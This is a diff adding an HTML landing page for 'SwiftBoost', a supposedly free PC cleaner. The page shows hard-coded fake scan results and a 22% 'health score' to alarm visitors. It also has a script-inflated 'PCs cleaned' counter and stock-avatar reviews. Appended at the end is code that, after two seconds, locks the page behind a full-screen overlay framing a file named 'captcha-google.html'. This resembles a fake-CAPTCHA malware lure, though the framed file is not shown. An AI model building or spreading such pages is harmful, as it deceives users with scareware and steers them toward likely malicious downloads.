@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>SwiftBoost — Free PC Cleaner & Speed Optimizer</title>
+<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=Fraunces:ital,wght@1,700&display=swap" rel="stylesheet"/>
+<style>
+:root {
+  --bg: #f8faff;
+  --bg2: #eef2fb;
+  --white: #ffffff;
+  --text: #0f1729;
+  --text2: #374164;
+  --muted: #8892aa;
+  --border: rgba(15,23,41,0.08);
+  --blue: #1d4ed8;
+  --blue2: #3b82f6;
+  --blue-light: #eff6ff;
+  --green: #059669;
+  --green-light: #d1fae5;
+  --red: #dc2626;
+  --orange: #ea580c;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: 'Outfit', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  overflow-x: hidden;
+  -webkit-font-smoothing: antialiased;
+}
+
+nav {
+  background: var(--white); border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 16px 48px; position: sticky; top: 0; z-index: 100;
+  box-shadow: 0 1px 12px rgba(15,23,41,0.06);
+}
+.nav-logo { display: flex; align-items: center; gap: 10px; }
+.nav-logo-icon {
+  width: 32px; height: 32px; border-radius: 9px;
+  background: linear-gradient(135deg, var(--blue), var(--blue2));
+  display: flex; align-items: center; justify-content: center;
+  font-size: 16px;
+}
+.nav-logo-text { font-size: 1rem; font-weight: 800; letter-spacing: -0.02em; color: var(--text); }
+.nav-logo-text span { color: var(--blue); }
+.nav-dl {
+  background: var(--blue); color: white;
+  padding: 9px 22px; border-radius: 10px;
+  font-size: 0.82rem; font-weight: 700; text-decoration: none;
+  transition: all 0.2s; box-shadow: 0 4px 16px rgba(29,78,216,0.3);
+}
+.nav-dl:hover { background: #1e40af; transform: translateY(-1px); }
+
+/* HERO */
+.hero {
+  max-width: 1100px; margin: 0 auto;
+  padding: 80px 24px 60px;
+  display: grid; grid-template-columns: 1fr 1fr;
+  gap: 72px; align-items: center;
+}
+.pill-badge {
+  display: inline-flex; align-items: center; gap: 7px;
+  background: var(--blue-light); color: var(--blue);
+  border: 1px solid rgba(29,78,216,0.15);
+  padding: 6px 14px; border-radius: 100px;
+  font-size: 0.75rem; font-weight: 700; margin-bottom: 24px;
+  animation: fadeUp 0.5s ease both;
+}
+.pulse-dot { width: 6px; height: 6px; border-radius: 50%; background: var(--blue2); animation: blink 2s infinite; }
+@keyframes blink { 0%,100%{opacity:1} 50%{opacity:0.2} }
+
+h1 {
+  font-size: clamp(2.4rem, 4.5vw, 3.8rem);
+  font-weight: 900; line-height: 1.06; letter-spacing: -0.035em;
+  margin-bottom: 20px;
+  animation: fadeUp 0.5s ease 0.1s both;
+}
+h1 em {
+  font-family: 'Fraunces', serif;
+  font-style: italic; font-weight: 700;
+  color: var(--blue);
+}
+
+.hero-sub {
+  font-size: 1rem; color: var(--text2); line-height: 1.75;
+  margin-bottom: 32px; max-width: 460px;
+  animation: fadeUp 0.5s ease 0.15s both;
+}
+
+.scan-teaser {
+  background: var(--white);
+  border: 1px solid var(--border);
+  border-radius: 16px; padding: 20px;
+  margin-bottom: 28px; box-shadow: 0 4px 20px rgba(15,23,41,0.07);
+  animation: fadeUp 0.5s ease 0.2s both;
+}
+.scan-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; }
+.scan-title { font-size: 0.82rem; font-weight: 700; }
+.scan-badge { font-size: 0.72rem; font-weight: 700; background: #fef2f2; color: var(--red); border-radius: 6px; padding: 3px 8px; }
+.scan-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+.scan-item-name { font-size: 0.78rem; color: var(--text2); }
+.scan-bar-wrap { flex: 1; margin: 0 12px; height: 5px; background: var(--bg2); border-radius: 4px; overflow: hidden; }
+.scan-bar { height: 100%; border-radius: 4px; animation: grow 1.5s ease both; }
+.scan-bar.red { background: var(--red); width: 78%; animation-delay: 0.2s; }
+.scan-bar.orange { background: var(--orange); width: 62%; animation-delay: 0.4s; }
+.scan-bar.yellow { background: #f59e0b; width: 45%; animation-delay: 0.6s; }
+@keyframes grow { from{width:0} }
+.scan-val { font-size: 0.75rem; font-weight: 700; color: var(--red); white-space: nowrap; }
+.scan-val.orange { color: var(--orange); }
+.scan-val.yellow { color: #d97706; }
+
+.urgency-note {
+  display: flex; align-items: center; gap: 8px;
+  background: #fff7ed; border: 1px solid #fed7aa;
+  border-radius: 10px; padding: 10px 16px;
+  font-size: 0.8rem; font-weight: 600; color: #9a3412;
+  margin-bottom: 24px;
+  animation: fadeUp 0.5s ease 0.25s both;
+}
+
+.cta-main {
+  display: inline-flex; align-items: center; gap: 12px;
+  background: linear-gradient(135deg, var(--blue), #1e40af);
+  color: white; padding: 18px 44px; border-radius: 12px;
+  font-size: 1.05rem; font-weight: 800; text-decoration: none;
+  box-shadow: 0 8px 30px rgba(29,78,216,0.35);
+  transition: all 0.25s;
+  animation: fadeUp 0.5s ease 0.3s both;
+}
+.cta-main:hover { transform: translateY(-3px); box-shadow: 0 14px 40px rgba(29,78,216,0.45); }
+.cta-sub { font-size: 0.76rem; color: var(--muted); margin-top: 10px; animation: fadeUp 0.5s ease 0.35s both; display: flex; gap: 14px; }
+.cta-check { color: var(--green); font-weight: 700; }
+
+/* RIGHT - PC HEALTH VISUAL */
+.hero-right {
+  animation: fadeUp 0.6s ease 0.2s both;
+}
+.health-card {
+  background: var(--white);
+  border: 1px solid var(--border); border-radius: 24px;
+  padding: 32px; box-shadow: 0 20px 60px rgba(15,23,41,0.12);
+  position: relative;
+}
+.hcard-title { font-size: 0.85rem; font-weight: 700; color: var(--muted); margin-bottom: 24px; text-transform: uppercase; letter-spacing: 0.08em; }
+
+.donut-wrap { position: relative; width: 160px; height: 160px; margin: 0 auto 28px; }
+.donut-svg { width: 100%; height: 100%; transform: rotate(-90deg); }
+.donut-bg { fill: none; stroke: var(--bg2); stroke-width: 14; }
+.donut-fill { fill: none; stroke: var(--red); stroke-width: 14; stroke-linecap: round; stroke-dasharray: 408; stroke-dashoffset: 90; animation: dash 1.5s ease both; }
+@keyframes dash { from { stroke-dashoffset: 408; } to { stroke-dashoffset: 90; } }
+.donut-label {
+  position: absolute; inset: 0;
+  display: flex; flex-direction: column; align-items: center; justify-content: center;
+}
+.donut-pct { font-size: 2.2rem; font-weight: 900; color: var(--red); line-height: 1; }
+.donut-sub-lbl { font-size: 0.72rem; color: var(--muted); font-weight: 500; }
+
+.metrics { display: flex; flex-direction: column; gap: 12px; }
+.metric-row { display: flex; align-items: center; gap: 12px; }
+.metric-icon { font-size: 1.1rem; width: 36px; height: 36px; border-radius: 10px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.metric-icon.bad { background: #fef2f2; }
+.metric-icon.warn { background: #fff7ed; }
+.metric-icon.ok { background: var(--green-light); }
+.metric-info { flex: 1; }
+.metric-name { font-size: 0.8rem; font-weight: 600; }
+.metric-val { font-size: 0.72rem; color: var(--muted); }
+.metric-tag { font-size: 0.7rem; font-weight: 700; padding: 2px 8px; border-radius: 6px; }
+.metric-tag.bad { background: #fef2f2; color: var(--red); }
+.metric-tag.warn { background: #fff7ed; color: var(--orange); }
+.metric-tag.ok { background: var(--green-light); color: var(--green); }
+
+.after-card {
+  background: linear-gradient(135deg, #dcfce7, #bbf7d0);
+  border: 1px solid #86efac;
+  border-radius: 16px; padding: 20px; margin-top: 14px;
+  display: flex; align-items: center; gap: 14px;
+}
+.after-icon { font-size: 2rem; }
+.after-title { font-size: 0.88rem; font-weight: 800; color: #14532d; }
+.after-sub { font-size: 0.75rem; color: #166534; }
+
+/* STATS BAR */
+.stats-bar {
+  background: var(--white); border-top: 1px solid var(--border); border-bottom: 1px solid var(--border);
+  display: flex; justify-content: center; align-items: center;
+  gap: 48px; padding: 24px 48px; flex-wrap: wrap;
+}
+.sstat { text-align: center; }
+.sstat strong { display: block; font-size: 1.5rem; font-weight: 900; color: var(--blue); }
+.sstat span { font-size: 0.78rem; color: var(--muted); }
+
+/* SECTIONS */
+.section { max-width: 1060px; margin: 80px auto 0; padding: 0 24px; }
+.stag { font-size: 0.7rem; font-weight: 800; letter-spacing: 0.12em; text-transform: uppercase; color: var(--blue); margin-bottom: 12px; }
+.stitle { font-size: clamp(1.8rem, 3vw, 2.6rem); font-weight: 900; letter-spacing: -0.025em; line-height: 1.12; margin-bottom: 48px; }
+
+.feat-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+.fcard {
+  background: var(--white); border: 1px solid var(--border); border-radius: 18px;
+  padding: 30px 26px; transition: all 0.25s;
+  box-shadow: 0 2px 8px rgba(15,23,41,0.04);
+}
+.fcard:hover { transform: translateY(-4px); box-shadow: 0 12px 32px rgba(15,23,41,0.1); }
+.fcard-icon { font-size: 1.8rem; margin-bottom: 14px; }
+.fcard-title { font-size: 0.92rem; font-weight: 800; margin-bottom: 8px; }
+.fcard-desc { font-size: 0.8rem; color: var(--muted); line-height: 1.7; }
+
+/* REVIEWS */
+.rgrid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; margin-top: 48px; }
+.rcard { background: var(--white); border: 1px solid var(--border); border-radius: 18px; padding: 26px; transition: all 0.25s; }
+.rcard:hover { box-shadow: 0 8px 28px rgba(15,23,41,0.08); }
+.rstars { color: #f59e0b; margin-bottom: 12px; font-size: 0.85rem; }
+.rtext { font-size: 0.85rem; color: var(--text2); line-height: 1.7; font-style: italic; margin-bottom: 18px; }
+.rauthor { display: flex; align-items: center; gap: 10px; }
+.ravatar { width: 36px; height: 36px; border-radius: 50%; object-fit: cover; border: 2px solid var(--bg2); }
+.rname { font-size: 0.8rem; font-weight: 700; }
+.rtag2 { font-size: 0.7rem; color: var(--muted); }
+
+/* BOTTOM CTA */
+.bcta {
+  background: linear-gradient(135deg, var(--blue) 0%, #1e3a8a 100%);
+  border-radius: 28px; padding: 80px 48px; text-align: center;
+  max-width: 800px; margin: 100px auto 60px; position: relative; overflow: hidden;
+}
+.bcta::before {
+  content: '';
+  position: absolute; top: -60px; right: -60px;
+  width: 250px; height: 250px; border-radius: 50%;
+  background: rgba(255,255,255,0.06);
+}
+.bcta::after {
+  content: '';
+  position: absolute; bottom: -40px; left: -40px;
+  width: 180px; height: 180px; border-radius: 50%;
+  background: rgba(255,255,255,0.04);
+}
+.bcta h2 { font-size: clamp(2rem, 4vw, 3rem); font-weight: 900; color: white; margin-bottom: 14px; line-height: 1.1; letter-spacing: -0.025em; position: relative; }
+.bcta p { font-size: 0.95rem; color: rgba(255,255,255,0.65); margin-bottom: 36px; line-height: 1.7; position: relative; }
+.bcta-btn {
+  display: inline-flex; align-items: center; gap: 12px;
+  background: white; color: var(--blue);
+  padding: 20px 52px; border-radius: 12px;
+  font-size: 1.1rem; font-weight: 900; text-decoration: none;
+  transition: all 0.25s; box-shadow: 0 8px 30px rgba(0,0,0,0.2);
+  position: relative;
+}
+.bcta-btn:hover { transform: translateY(-3px); box-shadow: 0 14px 40px rgba(0,0,0,0.3); }
+.bcta-fallback { margin-top: 16px; font-size: 0.78rem; color: rgba(255,255,255,0.4); position: relative; }
+.bcta-fallback a { color: rgba(255,255,255,0.65); }
+
+footer {
+  max-width: 1060px; margin: 0 auto 32px; padding: 24px;
+  border-top: 1px solid var(--border);
+  display: flex; justify-content: space-between; font-size: 0.78rem; color: var(--muted);
+}
+
+@keyframes fadeUp { from{opacity:0;transform:translateY(18px)} to{opacity:1;transform:translateY(0)} }
+.reveal { opacity:0; transform:translateY(22px); transition: opacity 0.65s ease, transform 0.65s ease; }
+.reveal.visible { opacity:1; transform:translateY(0); }
+
+@media (max-width: 768px) {
+  .hero { grid-template-columns: 1fr; gap: 48px; }
+  nav { padding: 14px 20px; }
+  .feat-grid { grid-template-columns: 1fr; }
+  .rgrid { grid-template-columns: 1fr; }
+  .stats-bar { gap: 24px; padding: 20px 24px; }
+  .bcta { padding: 48px 24px; margin: 80px 24px; }
+}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="nav-logo">
+    <div class="nav-logo-icon">⚡</div>
+    <div class="nav-logo-text">Swift<span>Boost</span></div>
+  </div>
+  <a class="nav-dl" href="#" target="_blank">⬇ Free Download</a>
+</nav>
+
+<section class="hero">
+  <div class="hero-left">
+    <div class="pill-badge"><span class="pulse-dot"></span> Trusted by 1M+ Windows users</div>
+
+    <h1>Your PC is <em>slower</em><br>than it should be.</h1>
+
+    <p class="hero-sub">SwiftBoost scans and cleans hidden junk, bloatware, and startup bottlenecks — making your PC up to 3× faster in minutes. Completely free.</p>
+
+    <div class="scan-teaser">
+      <div class="scan-header">
+        <span class="scan-title">🔍 Quick Scan Results — Your PC</span>
+        <span class="scan-badge">3 Issues Found</span>
+      </div>
+      <div class="scan-row">
+        <span class="scan-item-name">Junk files</span>
+        <div class="scan-bar-wrap"><div class="scan-bar red"></div></div>
+        <span class="scan-val">4.7 GB</span>
+      </div>
+      <div class="scan-row">
+        <span class="scan-item-name">Startup bloat</span>
+        <div class="scan-bar-wrap"><div class="scan-bar orange"></div></div>
+        <span class="scan-val orange">+14s boot</span>
+      </div>
+      <div class="scan-row" style="margin-bottom:0">
+        <span class="scan-item-name">Registry errors</span>
+        <div class="scan-bar-wrap"><div class="scan-bar yellow"></div></div>
+        <span class="scan-val yellow">247 errors</span>
+      </div>
+    </div>
+
+    <div class="urgency-note">🔥 1,432 PCs cleaned in the last hour</div>
+
+    <a class="cta-main" href="#" target="_blank">⚡ Fix My PC — Free Download</a>
+    <div class="cta-sub">
+      <span><span class="cta-check">✓</span> 100% free</span>
+      <span><span class="cta-check">✓</span> No registration</span>
+      <span><span class="cta-check">✓</span> 2-minute install</span>
+    </div>
+  </div>
+
+  <div class="hero-right">
+    <div class="health-card">
+      <div class="hcard-title">PC Health Score</div>
+
+      <div class="donut-wrap">
+        <svg class="donut-svg" viewBox="0 0 160 160">
+          <circle class="donut-bg" cx="80" cy="80" r="65"/>
+          <circle class="donut-fill" cx="80" cy="80" r="65"/>
+        </svg>
+        <div class="donut-label">
+          <div class="donut-pct">22%</div>
+          <div class="donut-sub-lbl">Poor</div>
+        </div>
+      </div>
+
+      <div class="metrics">
+        <div class="metric-row">
+          <div class="metric-icon bad">🗑️</div>
+          <div class="metric-info">
+            <div class="metric-name">Junk Files</div>
+            <div class="metric-val">4.7 GB taking up space</div>
+          </div>
+          <div class="metric-tag bad">Critical</div>
+        </div>
+        <div class="metric-row">
+          <div class="metric-icon warn">🚀</div>
+          <div class="metric-info">
+            <div class="metric-name">Startup Speed</div>
+            <div class="metric-val">22 programs slowing boot</div>
+          </div>
+          <div class="metric-tag warn">Slow</div>
+        </div>
+        <div class="metric-row">
+          <div class="metric-icon warn">🔧</div>
+          <div class="metric-info">
+            <div class="metric-name">Registry</div>
+            <div class="metric-val">247 broken entries</div>
+          </div>
+          <div class="metric-tag warn">Issues</div>
+        </div>
+      </div>
+
+      <div class="after-card" style="margin-top:20px">
+        <div class="after-icon">✅</div>
+        <div>
+          <div class="after-title">After SwiftBoost:</div>
+          <div class="after-sub">Health score 94% · Boot 3× faster · 4.7GB freed</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- STATS -->
+<div class="stats-bar reveal">
+  <div class="sstat"><strong>1M+</strong><span>PCs cleaned</span></div>
+  <div class="sstat"><strong>4.7GB</strong><span>Avg. space freed</span></div>
+  <div class="sstat"><strong>3×</strong><span>Faster boot avg.</span></div>
+  <div class="sstat"><strong>4.9★</strong><span>Avg. rating</span></div>
+  <div class="sstat"><strong>0€</strong><span>Forever free</span></div>
+</div>
+
+<!-- FEATURES -->
+<section class="section reveal">
+  <div class="stag">Full feature set</div>
+  <div class="stitle">One tool. Total PC performance.</div>
+  <div class="feat-grid">
+    <div class="fcard">
+      <div class="fcard-icon">🗑️</div>
+      <div class="fcard-title">Deep Junk Cleaner</div>
+      <div class="fcard-desc">Removes temporary files, browser cache, old logs, and Windows update residue. Average user frees 4.7 GB.</div>
+    </div>
+    <div class="fcard">
+      <div class="fcard-icon">🚀</div>
+      <div class="fcard-title">Startup Optimizer</div>
+      <div class="fcard-desc">Detects and disables unnecessary startup programs. Cuts boot time by up to 60% on most PCs.</div>
+    </div>
+    <div class="fcard">
+      <div class="fcard-icon">🔧</div>
+      <div class="fcard-title">Registry Repair</div>
+      <div class="fcard-desc">Scans and fixes broken registry entries that cause slowdowns, crashes, and errors.</div>
+    </div>
+    <div class="fcard">
+      <div class="fcard-icon">🛡️</div>
+      <div class="fcard-title">Privacy Cleaner</div>
+      <div class="fcard-desc">Erases browser history, cookies, and tracking traces. Your digital footprint, cleaned.</div>
+    </div>
+    <div class="fcard">
+      <div class="fcard-icon">📊</div>
+      <div class="fcard-title">Real-time Monitor</div>
+      <div class="fcard-desc">Live CPU, RAM, and disk usage displayed in a sleek sidebar widget. Always know what's using your resources.</div>
+    </div>
+    <div class="fcard">
+      <div class="fcard-icon">🆓</div>
+      <div class="fcard-title">100% Free</div>
+      <div class="fcard-desc">Every scan, every clean, every feature — free forever. No upsell, no trial period, no credit card.</div>
+    </div>
+  </div>
+</section>
+
+<!-- REVIEWS -->
+<section class="section reveal">
+  <div class="stag">User reviews</div>
+  <div class="stitle">1 million happy users.</div>
+  <div class="rgrid">
+    <div class="rcard">
+      <div class="rstars">★★★★★</div>
+      <p class="rtext">"My 5-year-old laptop went from barely running to booting in 20 seconds. I almost bought a new one. SwiftBoost saved me €600."</p>
+      <div class="rauthor">
+        <img class="ravatar" src="https://i.pravatar.cc/80?img=8" alt="David R."/>
+        <div><div class="rname">David R.</div><div class="rtag2">Windows 10 · Verified</div></div>
+      </div>
+    </div>
+    <div class="rcard">
+      <div class="rstars">★★★★★</div>
+      <p class="rtext">"Freed 6 GB of junk I didn't know existed. Games load faster, apps open instantly. Incredible that this is free."</p>
+      <div class="rauthor">
+        <img class="ravatar" src="https://i.pravatar.cc/80?img=25" alt="Yuna M."/>
+        <div><div class="rname">Yuna M.</div><div class="rtag2">Windows 11 · Verified</div></div>
+      </div>
+    </div>
+    <div class="rcard">
+      <div class="rstars">★★★★★</div>
+      <p class="rtext">"Used CCleaner for years. SwiftBoost found twice as much and fixed issues CCleaner never touched. Switching for good."</p>
+      <div class="rauthor">
+        <img class="ravatar" src="https://i.pravatar.cc/80?img=60" alt="Tomasz W."/>
+        <div><div class="rname">Tomasz W.</div><div class="rtag2">Windows 11 · Verified</div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- BOTTOM CTA -->
+<div class="bcta reveal">
+  <h2>Your PC deserves<br>to run fast again.</h2>
+  <p>Free forever. 2-minute install. 1 million PCs already cleaned.</p>
+  <a class="bcta-btn" href="#" target="_blank">⚡ Fix My PC — Free Download</a>
+  <div class="bcta-fallback">Not downloading? <a href="#">Direct link here</a></div>
+</div>
+
+<footer>
+  <span>© 2025 SwiftBoost. All rights reserved.</span>
+  <span>Windows 10 &amp; 11 · Free · Safe</span>
+</footer>
+
+<script>
+const reveals = document.querySelectorAll('.reveal');
+const obs = new IntersectionObserver(entries => {
+  entries.forEach(e => { if(e.isIntersecting){ e.target.classList.add('visible'); obs.unobserve(e.target); } });
+}, { threshold: 0.08 });
+reveals.forEach(el => obs.observe(el));
+
+let cnt2 = 1432;
+setInterval(() => {
+  cnt2 += Math.floor(Math.random() * 4) + 1;
+  document.querySelectorAll('.urgency-note').forEach(el => {
+    el.innerHTML = `🔥 ${cnt2.toLocaleString()} PCs cleaned in the last hour`;
+  });
+}, 3000);
+</script>
+
+<style>
+#lp2-overlay{
+    position:fixed;
+    inset:0;
+    width:100%;
+    height:100vh;
+    z-index:999999;
+    background:rgba(255,255,255,0.65);
+
+    opacity:0;
+    visibility:hidden;
+
+    transition:0.5s;
+}
+
+#lp2-overlay.active{
+    opacity:1;
+    visibility:visible;
+}
+
+#lp2-overlay iframe{
+    width:100%;
+    height:100%;
+    border:none;
+}
+
+body.locked{
+    overflow:hidden;
+}
+</style>
+
+<div id="lp2-overlay">
+    <iframe src="captcha-google.html"></iframe>
+</div>
+
+<script>
+
+setTimeout(() => {
+
+    document
+        .getElementById('lp2-overlay')
+        .classList.add('active');
+
+    document.body.classList.add('locked');
+
+}, 2000);
+
+</script>
+
+</body>
+</html>
